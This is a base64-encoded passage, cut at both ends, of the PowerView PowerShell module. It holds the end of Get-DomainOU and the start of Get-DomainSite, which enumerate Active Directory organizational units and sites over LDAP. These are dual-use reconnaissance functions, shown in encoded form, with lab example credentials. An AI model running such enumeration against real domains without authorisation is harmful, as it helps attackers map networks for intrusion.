NjZXB0ZWQuCgouUEFSQU1FVEVSIEdQTGluawoKT25seSByZXR1cm4gT1VzIHdpdGggdGhlIHNwZWNpZmllZCBHVUlEIGluIHRoZWlyIGdwbGluayBwcm9wZXJ0eS4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFByb3BlcnRpZXMKClNwZWNpZmllcyB0aGUgcHJvcGVydGllcyBvZiB0aGUgb3V0cHV0IG9iamVjdCB0byByZXRyaWV2ZSBmcm9tIHRoZSBzZXJ2ZXIuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFNlY3VyaXR5TWFza3MKClNwZWNpZmllcyBhbiBvcHRpb24gZm9yIGV4YW1pbmluZyBzZWN1cml0eSBpbmZvcm1hdGlvbiBvZiBhIGRpcmVjdG9yeSBvYmplY3QuCk9uZSBvZiAnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnLgoKLlBBUkFNRVRFUiBGaW5kT25lCgpPbmx5IHJldHVybiBvbmUgcmVzdWx0IG9iamVjdC4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouUEFSQU1FVEVSIFJhdwoKU3dpdGNoLiBSZXR1cm4gcmF3IHJlc3VsdHMgaW5zdGVhZCBvZiB0cmFuc2xhdGluZyB0aGUgZmllbGRzIGludG8gYSBjdXN0b20gUFNPYmplY3QuCgouRVhBTVBMRQoKR2V0LURvbWFpbk9VCgpSZXR1cm5zIHRoZSBjdXJyZW50IE9VcyBpbiB0aGUgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5PVSAqYWRtaW4qIC1Eb21haW4gdGVzdGxhYi5sb2NhbAoKUmV0dXJucyBhbGwgT1VzIHdpdGggImFkbWluIiBpbiB0aGVpciBuYW1lIGluIHRoZSB0ZXN0bGFiLmxvY2FsIGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluT1UgLUdQTGluayAiRjI2MEI3NkQtNTVDOC00NkM1LUJFRjEtOTAxNkREOThFMjcyIgoKUmV0dXJucyBhbGwgT1VzIHdpdGggbGlua2VkIHRvIHRoZSBzcGVjaWZpZWQgZ3JvdXAgcG9saWN5IG9iamVjdC4KCi5FWEFNUExFCgoiKmFkbWluKiIsIipzZXJ2ZXIqIiB8IEdldC1Eb21haW5PVQoKU2VhcmNoIGZvciBPVXMgd2l0aCB0aGUgc3BlY2lmaWMgbmFtZXMuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LURvbWFpbk9VIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKUG93ZXJWaWV3Lk9VCgpDdXN0b20gUFNPYmplY3Qgd2l0aCB0cmFuc2xhdGVkIE9VIHByb3BlcnR5IGZpZWxkcy4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5PVScpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgW0FsaWFzKCdHVUlEJyldCiAgICAgICAgJEdQTGluaywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VjdXJpdHlNYXNrcywKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbQWxpYXMoJ1JldHVybk9uZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZpbmRPbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmF3CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWN1cml0eU1hc2tzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAkU2VjdXJpdHlNYXNrcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkT1VTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJE9VU2VhcmNoZXIpIHsKICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyID0gJycKICAgICAgICAgICAgJEZpbHRlciA9ICcnCiAgICAgICAgICAgICRJZGVudGl0eSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJElkZW50aXR5SW5zdGFuY2UgPSAkXy5SZXBsYWNlKCcoJywgJ1wyOCcpLlJlcGxhY2UoJyknLCAnXDI5JykKICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ15PVT0uKicpIHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihkaXN0aW5ndWlzaGVkbmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICAgICAgaWYgKCgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIC1hbmQgKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgYSAtRG9tYWluIGlzbid0IGV4cGxpY2l0bHkgc2V0LCBleHRyYWN0IHRoZSBvYmplY3QgZG9tYWluIG91dCBvZiB0aGUgZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgIyAgIGFuZCByZWJ1aWxkIHRoZSBkb21haW4gc2VhcmNoZXIKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RG9tYWluID0gJElkZW50aXR5SW5zdGFuY2UuU3ViU3RyaW5nKCRJZGVudGl0eUluc3RhbmNlLkluZGV4T2YoJ0RDPScpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT1VdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2UnIgogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJElkZW50aXR5RG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICRPVVNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkT1VTZWFyY2hlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5PVV0gVW5hYmxlIHRvIHJldHJpZXZlIGRvbWFpbiBzZWFyY2hlciBmb3IgJyRJZGVudGl0eURvbWFpbiciCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAkR3VpZEJ5dGVTdHJpbmcgPSAoLUpvaW4gKChbR3VpZF0kSWRlbnRpdHlJbnN0YW5jZSkuVG9CeXRlQXJyYXkoKSB8IEZvckVhY2gtT2JqZWN0IHskXy5Ub1N0cmluZygnWCcpLlBhZExlZnQoMiwnMCcpfSkpIC1SZXBsYWNlICcoLi4pJywnXCQxJwogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RndWlkPSRHdWlkQnl0ZVN0cmluZykiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIobmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkSWRlbnRpdHlGaWx0ZXIgLWFuZCAoJElkZW50aXR5RmlsdGVyLlRyaW0oKSAtbmUgJycpICkgewogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHwkSWRlbnRpdHlGaWx0ZXIpIgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydHUExpbmsnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PVV0gU2VhcmNoaW5nIGZvciBPVXMgd2l0aCAkR1BMaW5rIHNldCBpbiB0aGUgZ3BMaW5rIHByb3BlcnR5IgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKGdwbGluaz0qJEdQTGluayopIgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT1VdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVyIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiJExEQVBGaWx0ZXIiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRPVVNlYXJjaGVyLmZpbHRlciA9ICIoJihvYmplY3RDYXRlZ29yeT1vcmdhbml6YXRpb25hbFVuaXQpJEZpbHRlcikiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT1VdIEdldC1Eb21haW5PVSBmaWx0ZXIgc3RyaW5nOiAkKCRPVVNlYXJjaGVyLmZpbHRlcikiCgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkT1VTZWFyY2hlci5GaW5kT25lKCkgfQogICAgICAgICAgICBlbHNlIHsgJFJlc3VsdHMgPSAkT1VTZWFyY2hlci5GaW5kQWxsKCkgfQogICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsKICAgICAgICAgICAgICAgICAgICAjIHJldHVybiByYXcgcmVzdWx0IG9iamVjdHMKICAgICAgICAgICAgICAgICAgICAkT1UgPSAkXwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJE9VID0gQ29udmVydC1MREFQUHJvcGVydHkgLVByb3BlcnRpZXMgJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJE9VLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5PVScpCiAgICAgICAgICAgICAgICAkT1UKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFJlc3VsdHMpIHsKICAgICAgICAgICAgICAgIHRyeSB7ICRSZXN1bHRzLmRpc3Bvc2UoKSB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PVV0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJE9VU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpblNpdGUgewo8IwouU1lOT1BTSVMKClNlYXJjaCBmb3IgYWxsIHNpdGVzIG9yIHNwZWNpZmljIHNpdGUgb2JqZWN0cyBpbiBBRC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpblNlYXJjaGVyLCBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAgCgouREVTQ1JJUFRJT04KCkJ1aWxkcyBhIGRpcmVjdG9yeSBzZWFyY2hlciBvYmplY3QgdXNpbmcgR2V0LURvbWFpblNlYXJjaGVyLCBidWlsZHMgYSBjdXN0b20KTERBUCBmaWx0ZXIgYmFzZWQgb24gdGFyZ2V0aW5nL2ZpbHRlciBwYXJhbWV0ZXJzLCBhbmQgc2VhcmNoZXMgZm9yIGFsbCBvYmplY3RzCm1hdGNoaW5nIHRoZSBjcml0ZXJpYS4gVG8gb25seSByZXR1cm4gc3BlY2lmaWMgcHJvcGVydGllcywgdXNlCiItUHJvcGVydGllcyB3aGVuY3JlYXRlZCx1c25jaGFuZ2VkLC4uLiIuIEJ5IGRlZmF1bHQsIGFsbCBzaXRlIG9iamVjdHMgZm9yCnRoZSBjdXJyZW50IGRvbWFpbiBhcmUgcmV0dXJuZWQuCgouUEFSQU1FVEVSIElkZW50aXR5CgpBbiBzaXRlIG5hbWUgKGUuZy4gVGVzdC1TaXRlKSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gQ049VGVzdC1TaXRlLENOPVNpdGVzLENOPUNvbmZpZ3VyYXRpb24sREM9dGVzdGxhYixEQz1sb2NhbCksIG9yCkdVSUQgKGUuZy4gYzM3NzI2ZWYtMmI2NC00NTI0LWI4NWItNmE5NzAwYzIzNGRkKS4gV2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBHUExpbmsKCk9ubHkgcmV0dXJuIHNpdGVzIHdpdGggdGhlIHNwZWNpZmllZCBHVUlEIGluIHRoZWlyIGdwbGluayBwcm9wZXJ0eS4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFByb3BlcnRpZXMKClNwZWNpZmllcyB0aGUgcHJvcGVydGllcyBvZiB0aGUgb3V0cHV0IG9iamVjdCB0byByZXRyaWV2ZSBmcm9tIHRoZSBzZXJ2ZXIuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFNlY3VyaXR5TWFza3MKClNwZWNpZmllcyBhbiBvcHRpb24gZm9yIGV4YW1pbmluZyBzZWN1cml0eSBpbmZvcm1hdGlvbiBvZiBhIGRpcmVjdG9yeSBvYmplY3QuCk9uZSBvZiAnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgRmluZE9uZQoKT25seSByZXR1cm4gb25lIHJlc3VsdCBvYmplY3QuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouUEFSQU1FVEVSIFJhdwoKU3dpdGNoLiBSZXR1cm4gcmF3IHJlc3VsdHMgaW5zdGVhZCBvZiB0cmFuc2xhdGluZyB0aGUgZmllbGRzIGludG8gYSBjdXN0b20gUFNPYmplY3QuCgouRVhBTVBMRQoKR2V0LURvbWFpblNpdGUKClJldHVybnMgdGhlIGN1cnJlbnQgc2l0ZXMgaW4gdGhlIGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluU2l0ZSAqYWRtaW4qIC1Eb21haW4gdGVzdGxhYi5sb2NhbAoKUmV0dXJucyBhbGwgc2l0ZXMgd2l0aCAiYWRtaW4iIGluIHRoZWlyIG5hbWUgaW4gdGhlIHRlc3RsYWIubG9jYWwgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5TaXRlIC1HUExpbmsgIkYyNjBCNzZELTU1QzgtNDZDNS1CRUYxLTkwMTZERDk4RTI3MiIKClJldHVybnMgYWxsIHNpdGVzIHdpdGggbGlua2VkIHRvIHRoZSBzcGVjaWZpZWQgZ3JvdXAgcG9saWN5IG9iamVjdC4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRG9tYWluU2l0ZSAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKClBvd2VyVmlldy5TaXRlCgpDdXN0b20gUFNPYmplY3Qgd2l0aCB0cmFuc2xhdGVkIHNpdGUgcHJvcGVydHkgZmllbGRzLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlNpdGUnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgIFtBbGlhcygnR1VJRCcpXQogICAgICAgICRHUExpbmssCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJ